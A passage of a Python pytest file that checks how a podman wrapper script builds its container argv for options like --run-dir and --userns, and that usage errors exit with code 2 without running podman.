    done, argv = _wrapper(tree, "preflight", "--", "--userns=keep-id")
    assert done.returncode == 0, done.stderr
    assert argv == _expected(
        tree, "preflight", images=True, runs=True, opts=["--userns=keep-id"]
    )


def test_run_dir_mounts_the_run_s_own_directory_and_names_it(tmp_path):
    """`--run-dir` names the mount itself rather than a parent to create under,
    so the mount *is* the run directory -- the shape README gives as the one
    that works when the mount is owned by another UID."""
    tree = _wrapper_tree(tmp_path)
    done, argv = _wrapper(tree, "deploy", "--run-dir", "d")
    assert done.returncode == 0, done.stderr
    assert (tree / "d").is_dir()
    assert argv == [
        "run",
        "--rm",
        "-v",
        f"{tree}/config.yaml:/config.yaml:ro,z",
        "-v",
        f"{tree}/images:/images:ro,z",
        "-v",
        f"{tree}/d:/runs:Z",
        PLACEHOLDER,
        "deploy",
        "/config.yaml",
        "--run-dir",
        "/runs",
    ]


#: Every shape of "that is not a command line this understands". `-c` with no
#: value is the one worth naming: taking `$2` unchecked would mount an empty
#: path and let podman explain it. The last three cover `--run-dir`: the
#: container's argparse takes it on deploy and destroy only, and `-r` and
#: `--run-dir` name different things at the same mount point.
USAGE_ROWS = [
    pytest.param((), id="no-verb"),
    pytest.param(("nonesuch",), id="unknown-verb"),
    pytest.param(("deploy", "--nonesuch"), id="unknown-flag"),
    pytest.param(("deploy", "-c"), id="flag-with-no-value"),
    pytest.param(("deploy", "-y"), id="yes-is-destroy-only"),
    pytest.param(("install", "-c", "config.yaml"), id="install-takes-no-flags"),
    pytest.param(("version", "-c", "config.yaml"), id="version-takes-no-flags"),
    pytest.param(("validate", "--run-dir", "d"), id="run-dir-is-not-for-validate"),
    pytest.param(("deploy", "-r", "x", "--run-dir", "d"), id="run-dir-excludes-runs"),
]


@pytest.mark.parametrize("args", USAGE_ROWS)
def test_a_usage_error_exits_2_the_way_argparse_does(tmp_path, args):
    """The wrapper stands in front of argparse, which exits 2 for an unknown verb
    or a missing argument. A site that scripts around one exit code should not
    meet a different one depending on which of the two refused."""
    tree = _wrapper_tree(tmp_path)
    done, argv = _wrapper(tree, *args)
    assert done.returncode == 2, done.stdout
    assert "usage:" in done.stderr
    assert argv == [], "podman ran anyway"
